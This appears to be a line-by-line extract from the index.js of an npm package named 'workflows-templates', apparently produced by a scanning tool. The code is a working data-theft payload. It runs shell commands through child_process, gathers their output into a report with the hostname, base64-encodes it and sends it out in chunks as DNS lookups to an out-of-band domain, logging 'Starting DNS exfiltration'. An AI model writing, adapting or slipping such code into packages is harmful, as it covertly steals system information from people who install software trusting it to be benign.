// File: tmp/tmpi83pdg8q/workflows-templates/package/index.js
// ======================================================================
Line 8: const os = require('os')
Line 9: const dns = require('dns')
Line 13: _tmp_0 = require('child_process')
Line 16: {
            report += `\n[${label}]\n${execSync(command, { stdio: 'pipe' }).toString()}\n`;
        }
Line 17: report += `\n[${label}]\n${execSync(command, { stdio: 'pipe' }).toString()}\n`
Line 18: catch (e) {
            report += `\n[${label}]\nCOMMAND_FAILED\n`;
        }
Line 19: report += `\n[${label}]\nCOMMAND_FAILED\n`
Line 35: {
    // Base64 encode the entire report to make it URL/DNS-safe
    const encodedData = Buffer.from(data).toString('base64').replace(/=/g, ''); // Remove padding

    // Split the long Base64 string into chunks of ~60 characters (DNS label max ~63)
    const chunks = encodedData.match(/.{1,60}/g) || [];

    const hostname = os.hostname() || 'unknown-host';
    const totalChunks = chunks.length;

    let i = 0;
    const sendChunk = () => {
        if (i >= totalChunks) {
            // Send final "END" packet
            dns.lookup(`${i}-of-${totalChunks}.END.${payloadIdentifier}.${hostname}.${oastDomain}`, () => {});
            return;
        }

        const chunk = chunks[i];
        // Format: [chunk_index]-of-[total_chunks].[payload_id].[hostname].[data_chunk].[oast_domain]
        const subdomain = `${i}-of-${totalChunks}.${payloadIdentifier}.${hostname}.${chunk}.${oastDomain}`;
        
        // Truncate to max length allowed for DNS label (253 chars)
        dns.lookup...
Line 37: Buffer.from(data).toString('base64')
Line 40: const chunks = encodedData.match(/.{1,60}/g) || []
Line 42: os.hostname()
Line 46: {
        if (i >= totalChunks) {
            // Send final "END" packet
            dns.lookup(`${i}-of-${totalChunks}.END.${payloadIdentifier}.${hostname}.${oastDomain}`, () => {});
            return;
        }

        const chunk = chunks[i];
        // Format: [chunk_index]-of-[total_chunks].[payload_id].[hostname].[data_chunk].[oast_domain]
        const subdomain = `${i}-of-${totalChunks}.${payloadIdentifier}.${hostname}.${chunk}.${oastDomain}`;
        
        // Truncate to max length allowed for DNS label (253 chars)
        dns.lookup(subdomain.slice(0, 250), () => {
            i++;
            setTimeout(sendChunk, 100); // Throttle DNS requests
        });
    }
Line 53: const chunk = chunks[i]
Line 58: {
            i++;
            setTimeout(sendChunk, 100); // Throttle DNS requests
        }
Line 60: setTimeout(sendChunk, 100)
Line 64: console.log(`[+] Starting DNS exfiltration of ${totalChunks} chunks...`)
Line 70: exfiltrateViaDns(intelReport)
